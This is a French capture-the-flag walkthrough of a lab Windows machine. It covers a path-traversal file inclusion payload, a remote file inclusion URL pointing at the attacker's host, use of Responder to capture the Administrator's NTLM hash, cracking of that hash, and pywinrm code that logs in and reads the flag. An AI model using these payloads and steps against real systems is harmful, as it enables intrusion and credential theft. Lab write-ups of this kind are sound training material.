## App web
La machine expose un site web sur son port 80. 
On remarque que l'on peut changer la langue, et dans ce cas l'URL devient : http://10.10.10.10/page=french.html
### Local File Inclusion
De là on essaie de faire une attaque LFI (Local File Inclusion) et ça fonctionne !
L'URL suivant permet d'afficher un fichier local du serveur Windows http://10.10.10.10/page=../../../../../windows/system32/drivers/etc/hosts.
### Remote File Inclusion
On remarque que l'on peut également demander au serveur de nous servir un fichier présent sur une autre machine. On le teste en créant un serveur sur notre machine et en précisant notre IP dans le LFI
http://10.10.10.10/page=//10.10.15.15/myfile.txt

## Responder
On met en route l'outil Responder sur notre machine et on reproduit le RFI précédent. Le serveur distant envoie le hash NTLM de l'utilisateur Administrator lorsqu'il essaie de récupérer le fichier que l'on héberge `myfile`.
```bash
ip a
# On identifie l'interface réseau qui correspond au VPN : "tun0"
python3 Responder.py -I tun0
# On intercepte le hash NTLM
```

Ainsi, on récupère le hash NTLM du compte local Administrator de la machine Windows.
On casse le hash avec John The Ripper, et le mot de passe est "badminton".

## WinRM
Un autre port est ouvert sur la machine : le 5985, qui expose le service de prise en main à distance WinRM.
On utilise la librairie python `pywinrm` pour s'y connecter avec les identifiants récupérés.
```python
import winrm
session = winrm.Session('10.10.10.10', auth=('Administrator', 'badminton'), transport = 'ntlm')
r = session.run_cmd('dir')
r.std_out
# ...
# on finit par trouver le flag et l'afficher
r = session.run_cmd('type ../mike/Desktop//flag.txt')
r.std_out
```



